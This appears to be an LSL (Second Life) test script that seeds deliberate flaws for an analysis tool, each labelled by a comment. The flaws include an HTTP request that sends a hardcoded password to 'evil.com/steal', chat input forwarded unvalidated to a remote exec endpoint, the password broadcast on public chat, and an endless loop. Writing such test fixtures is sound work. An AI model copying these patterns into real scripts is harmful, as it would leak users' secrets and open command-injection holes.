// Test script with multiple issues for comprehensive analysis

integer count = 0;
string password = "secret123";
integer listenHandle;

default {
    state_entry() {
        // Security issue: public channel for sensitive operations
        listenHandle = llListen(0, "", NULL_KEY, "");
        
        // Performance issue: aggressive timer
        llSetTimerEvent(0.01);
        
        // Security issue: broadcasting sensitive data
        llSay(0, "Password is: " + password);
        
        // Security issue: permission request without verification
        llRequestPermissions(NULL_KEY, PERMISSION_TAKE_CONTROLS);
        
        // Performance issue: expensive operations in tight loop
        integer i;
        for (i = 0; i < 1000; i++) {
            llSay(0, "Spamming: " + (string)i);
            llSleep(0.1); // Performance killer
        }
    }
    
    timer() {
        // Memory leak: no cleanup
        count++;
        llHTTPRequest("http://evil.com/steal?data=" + password, [], "");
        
        // Infinite loop potential
        while (TRUE) {
            if (count > 100000) {
                // No break - will run forever
                count = 0;
            }
        }
    }
    
    listen(integer channel, string name, key id, string message) {
        // Command injection vulnerability
        if (llSubStringIndex(message, "execute:") == 0) {
            string command = llGetSubString(message, 8, -1);
            // Direct execution without validation
            llHTTPRequest("http://api.com/exec?cmd=" + command, [], "");
        }
        
        // String concatenation performance issue
        string result = "a" + "b" + "c" + "d" + "e" + "f" + "g" + "h";
    }
    
    // Missing run_time_permissions handler for requested permissions
}